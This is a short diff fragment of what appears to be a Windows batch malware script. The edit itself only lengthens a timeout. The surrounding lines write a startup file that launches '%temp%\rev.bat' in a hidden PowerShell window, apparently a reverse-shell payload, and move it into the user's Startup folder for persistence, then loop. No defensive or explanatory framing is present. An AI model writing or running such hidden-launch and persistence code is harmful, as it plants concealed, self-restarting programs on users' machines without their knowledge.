@@ -12,7 +12,7 @@
         echo powershell -c "Start-Process -FilePath "%temp%\rev.bat" -WindowStyle Hidden" >> "%temp%\start.bat"
         move "%temp%\start.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\" 
     )
-    timeout /t 7 /nobreak >nul
+    timeout /t 15 /nobreak >nul
     goto check_start_bat
 timeout /t 300 /nobreak >nul
 goto loop
